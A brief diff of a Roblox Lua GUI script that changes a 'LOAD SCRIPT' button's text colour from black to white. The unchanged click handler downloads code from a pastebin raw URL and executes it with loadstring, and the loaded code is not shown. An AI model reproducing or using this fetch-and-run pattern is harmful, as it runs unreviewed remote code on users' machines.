@@ -52,7 +52,7 @@ TextButton.Position = UDim2.new(0.13454546, 0, 0.248908296, 0)
 TextButton.Size = UDim2.new(0, 200, 0, 105)
 TextButton.Font = Enum.Font.SourceSans
 TextButton.Text = "LOAD SCRIPT"
-TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextButton.TextSize = 30.000
 TextButton.MouseButton1Down:connect(function() loadstring(game:HttpGet('https://pastebin.com/raw/mqPz1Xz1'))()
 end)
